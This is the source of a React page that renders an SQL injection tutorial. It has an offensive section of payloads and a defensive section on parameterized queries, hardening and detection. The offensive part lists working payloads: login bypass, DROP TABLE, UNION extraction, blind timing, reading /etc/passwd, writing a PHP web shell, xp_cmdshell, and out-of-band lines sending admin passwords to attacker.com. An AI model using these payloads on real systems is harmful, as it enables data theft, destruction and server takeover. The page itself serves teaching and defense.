// File: /app/sql-injection/page.tsx
export default function SQLInjectionPage() {
  return (
    <main className="p-8 max-w-4xl mx-auto font-sans text-white">
      <h1 className="text-4xl font-extrabold mb-8 text-purple-600">SQL Injection (SQLi) Comprehensive Guide</h1>

      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-3">What is SQL Injection?</h2>
        <p className="leading-relaxed">
          SQL Injection is one of the most dangerous and widespread web application vulnerabilities. It arises when untrusted user input is directly embedded into SQL queries without proper sanitization, allowing attackers to modify the intended query behavior.
        </p>
        <div className="mt-4 p-4 bg-gray-800 rounded-lg">
          <h3 className="text-lg font-semibold mb-2 text-orange-300">SQLi Impact Severity:</h3>
          <ul className="list-disc list-inside space-y-1">
            <li>Unauthorized data access (PII, credentials, sensitive data)</li>
            <li>Database modification or deletion</li>
            <li>Authentication bypass</li>
            <li>Remote code execution</li>
            <li>Complete system compromise</li>
          </ul>
        </div>
      </section>

      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-red-600">Red Team Techniques (Offensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Basic Injection Testing</h3>
          
          <h4 className="font-medium mb-1 mt-3">Common Payloads</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`' OR '1'='1
" OR "" = "
' OR 1=1--
'; DROP TABLE users--`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Error-Based Detection</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`' AND 1=CONVERT(int, @@version)--
' AND 1=CONVERT(int, db_name())--`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Union-Based Injection</h3>
          
          <h4 className="font-medium mb-1 mt-3">Column Enumeration</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`ORDER BY 1-- 
ORDER BY 2--
...
ORDER BY 10--`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Data Extraction</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`UNION SELECT 1,2,3,4--
UNION SELECT null,table_name,null FROM information_schema.tables--
UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">3. Blind Injection</h3>
          
          <h4 className="font-medium mb-1 mt-3">Boolean-Based</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`AND SUBSTRING((SELECT @@version),1,1)='M'
AND (SELECT COUNT(*) FROM users) > 10`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Time-Based</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`MySQL: AND IF(1=1,SLEEP(5),0)
MSSQL: WAITFOR DELAY '0:0:5'
Oracle: AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">4. Advanced Techniques</h3>
          
          <h4 className="font-medium mb-1 mt-3">Out-of-Band (OOB)</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`Oracle: 
UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE username='admin'))

MSSQL: 
EXEC master..xp_dirtree '\\attacker.com\'+(SELECT TOP 1 password FROM users)'`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Second-Order</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`Register with username: '; UPDATE users SET password='hacked' WHERE username='admin'--`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">5. Database-Specific Payloads</h3>
          
          <h4 className="font-medium mb-1 mt-3">MySQL</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`SELECT LOAD_FILE('/etc/passwd')
SELECT @@datadir
INTO OUTFILE '/var/www/shell.php'`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">MSSQL</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`EXEC xp_cmdshell 'whoami'
SELECT * FROM OPENROWSET('SQLOLEDB','server';'sa';'password','SELECT 1')`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Oracle</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='admin')) FROM dual`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">6. Tools & Automation</h3>
          
          <h4 className="font-medium mb-1 mt-3">Discovery</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Burp Suite Scanner</li>
            <li>SQLiPy (Burp plugin)</li>
            <li>Havij</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Exploitation</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>sqlmap</li>
            <li>NoSQLMap (for NoSQL)</li>
            <li>BBQSQL (blind SQLi)</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Post-Exploitation</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>PowerUpSQL (MSSQL)</li>
            <li>ODAT (Oracle)</li>
            <li>MySQL UDF Exploitation</li>
          </ul>
        </article>
      </section>

      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-blue-600">Blue Team Defenses (Defensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">1. Secure Coding</h3>
          
          <h4 className="font-medium mb-1 mt-3">Parameterized Queries</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Python with psycopg2
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))

// Java with PreparedStatement
PreparedStatement stmt = conn.prepareStatement(
  "SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">ORM Best Practices</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# Django ORM (safe)
User.objects.raw('SELECT * FROM users WHERE username = %s', [username])

# Never do this (vulnerable)
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">2. Input Validation</h3>
          
          <h4 className="font-medium mb-1 mt-3">Whitelisting</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Only allow alphanumeric for usernames
if (!username.matches("^[a-zA-Z0-9]+$")) {
  throw new ValidationException("Invalid username");
}`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Type Safety</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// For numeric IDs, parse early
int id = Integer.parseInt(request.getParameter("id"));
// This will throw NumberFormatException for SQLi attempts`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">3. Database Hardening</h3>
          
          <h4 className="font-medium mb-1 mt-3">Least Privilege</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>READ ONLY for reporting</li>
            <li>No DROP/CREATE for app users</li>
            <li>Disable xp_cmdshell in MSSQL</li>
            <li>Restrict FILE privilege in MySQL</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Secure Configurations</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Disable verbose errors</li>
            <li>Use stored procedures carefully</li>
            <li>Enable only needed DB functions</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">4. Runtime Protections</h3>
          
          <h4 className="font-medium mb-1 mt-3">WAF Rules</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Block common SQLi patterns</li>
            <li>Rate limit parameter fuzzing</li>
            <li>Virtual patching for known vulns</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">RASP</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Runtime Application Self-Protection</li>
            <li>Blocks malicious SQL at runtime</li>
            <li>Provides attack telemetry</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">5. Monitoring & Response</h3>
          
          <h4 className="font-medium mb-1 mt-3">Detection Signatures</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>UNION SELECT in queries</li>
            <li>Multiple OR/AND conditions</li>
            <li>SLEEP/WATTFOR commands</li>
            <li>Information_schema access</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Log Analysis</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>SIEM integration</li>
            <li>Anomaly detection</li>
            <li>Query timing analysis</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Incident Response</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Query kill switches</li>
            <li>Automatic session termination</li>
            <li>Forensic query logging</li>
          </ul>
        </article>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-semibold mb-4">Additional Resources & References</h2>
        <div className="space-y-6">
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Learning Resources</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PortSwigger SQL Injection Academy — Interactive labs
                </a>
              </li>
              <li>
                <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP SQL Injection — Comprehensive documentation
                </a>
              </li>
              <li>
                <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PayloadsAllTheThings SQLi — Cheat sheet
                </a>
              </li>
            </ul>
          </div>
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Security Tools</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://sqlmap.org/" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  SQLMap — Automated SQL injection tool
                </a>
              </li>
              <li>
                <a href="https://github.com/ron190/jsql-injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  jSQL Injection — Java-based GUI tool
                </a>
              </li>
              <li>
                <a href="https://github.com/codingo/NoSQLMap" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  NoSQLMap — For NoSQL injection
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>

      <div className="p-4 bg-gray-800 rounded-lg border-l-4 border-purple-500">
        <h3 className="text-lg font-semibold mb-2 text-purple-400">SQL Injection Mitigation Checklist</h3>
        <ul className="list-disc list-inside ml-4 space-y-1">
          <li>Use parameterized queries/prepared statements exclusively</li>
          <li>Implement strict input validation (whitelisting preferred)</li>
          <li>Apply principle of least privilege to database accounts</li>
          <li>Disable verbose error messages in production</li>
          <li>Regularly update database software and libraries</li>
          <li>Implement WAF rules for SQLi patterns</li>
          <li>Monitor for suspicious database activity</li>
          <li>Conduct regular security testing and code reviews</li>
        </ul>
      </div>
    </main>
  );
}